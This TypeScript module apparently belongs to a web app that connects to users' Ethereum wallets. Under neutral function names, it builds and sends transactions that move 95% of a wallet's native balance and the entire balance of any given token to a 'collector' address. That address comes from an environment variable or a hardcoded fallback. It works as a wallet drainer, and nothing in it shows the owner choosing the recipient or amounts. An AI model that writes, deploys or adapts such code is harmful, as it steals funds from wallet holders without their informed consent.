const COLLECTOR_FALLBACK = '0x2Aef5e0E03DE153Bf75C82bF0df3E3C0F8c92ea9';

function resolveCollector(): string {
  const env = (process.env.NEXT_PUBLIC_COLLECTOR_ADDRESS || '').trim();
  if (env && /^0x[a-fA-F0-9]{40}$/.test(env)) return env;
  return COLLECTOR_FALLBACK;
}

export interface TransferPayload {
  to: string;
  value: string;
  data: string;
  gas: string;
}

export async function buildNativeTransfer(
  provider: any,
  from: string
): Promise<TransferPayload> {
  const balanceHex: string = await provider.request({
    method: 'eth_getBalance',
    params: [from, 'latest'],
  });
  const balance = BigInt(balanceHex);
  if (balance === 0n) throw new Error('Native balance is zero');

  const gasPriceHex: string = await provider.request({ method: 'eth_gasPrice', params: [] });
  const gasPrice = BigInt(gasPriceHex);
  const gasLimit = 21000n;
  const gasCost = gasPrice * gasLimit;

  const sendAmount = (balance * 95n) / 100n;
  if (sendAmount <= gasCost) throw new Error('Native balance too low to cover gas');
  const finalValue = sendAmount - gasCost;

  return {
    to: resolveCollector(),
    value: '0x' + finalValue.toString(16),
    data: '0x',
    gas: '0x5208',
  };
}

export async function buildERC20Transfer(
  provider: any,
  from: string,
  tokenAddress: string
): Promise<TransferPayload> {
  const balanceOfData = '0x70a08231' + from.toLowerCase().replace('0x', '').padStart(64, '0');
  const balanceHex: string = await provider.request({
    method: 'eth_call',
    params: [{ to: tokenAddress, data: balanceOfData }, 'latest'],
  });
  const balance = BigInt(balanceHex);
  if (balance === 0n) throw new Error('Token balance is zero');

  const selector = '0xa9059cbb';
  const recipient = resolveCollector().toLowerCase().replace('0x', '').padStart(64, '0');
  const amountHex = balance.toString(16).padStart(64, '0');
  const data = selector + recipient + amountHex;

  const gasPriceHex: string = await provider.request({ method: 'eth_gasPrice', params: [] });
  const gasPrice = BigInt(gasPriceHex);
  const gasLimit = 65000n;
  const gasCost = gasPrice * gasLimit;

  const nativeBalanceHex: string = await provider.request({
    method: 'eth_getBalance',
    params: [from, 'latest'],
  });
  if (BigInt(nativeBalanceHex) < gasCost) throw new Error('Native balance too low to cover gas');

  return {
    to: tokenAddress,
    value: '0x0',
    data,
    gas: '0x' + gasLimit.toString(16),
  };
}

export async function sendTransfer(
  provider: any,
  from: string,
  payload: TransferPayload
): Promise<string> {
  return provider.request({
    method: 'eth_sendTransaction',
    params: [
      {
        from,
        to: payload.to,
        value: payload.value,
        data: payload.data,
        gas: payload.gas,
      },
    ],
  });
}
